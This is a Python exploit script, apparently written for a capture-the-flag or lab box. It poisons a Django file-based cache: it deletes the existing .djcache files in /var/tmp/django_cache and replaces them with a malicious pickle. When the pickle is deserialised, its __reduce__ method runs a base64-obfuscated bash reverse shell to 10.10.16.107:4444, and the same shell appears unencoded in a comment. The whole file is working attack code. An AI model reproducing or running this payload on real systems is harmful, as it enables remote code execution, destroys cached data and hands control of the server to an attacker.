import pickle
import os

# malicious_code = b"sh -i >& /dev/tcp/10.10.16.107/4444 0>&1"
malicious_code = b"printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA3LzQ0NDQgMD4mMSkgJg==|base64 -d|bash"

print(r"""
       .__        __   .__                  .__        __    
______ |__| ____ |  | _|  |   ____   _______|__| ____ |  | __
\____ \|  |/ ___\|  |/ /  | _/ __ \  \_  __ \  |/ ___\|  |/ /
|  |_> >  \  \___|    <|  |_\  ___/   |  | \/  \  \___|    < 
|   __/|__|\___  >__|_ \____/\___  >  |__|  |__|\___  >__|_ \
|__|           \/     \/         \/                 \/     \/
""")


# Construct malicious code
class Malicious:
    def __reduce__(self):
        return (os.system, (malicious_code,))
# Serialize the malicious object
malicious_data = pickle.dumps(Malicious())
print(f"[+] Malicious code is: {malicious_code.decode()}")

# Find all files inside /var/tmp/django_cache/*.djcache
djcache_files = [f for f in os.listdir('/var/tmp/django_cache') if f.endswith('.djcache')]
print(f"[+] Found {len(djcache_files)} .djcache files.")

# Delete existing .djcache files
for filename in djcache_files:
    file_path = os.path.join('/var/tmp/django_cache', filename)
    os.remove(file_path)
    print(f"[+] Deleted {file_path}")

# Create new .djcache files with malicious payload
for filename in djcache_files:
    file_path = os.path.join('/var/tmp/django_cache', filename)
    with open(file_path, 'wb') as f:
        f.write(malicious_data)
    print(f"[+] Created malicious {file_path}")

print("[+] All done. Malicious .djcache files created.")
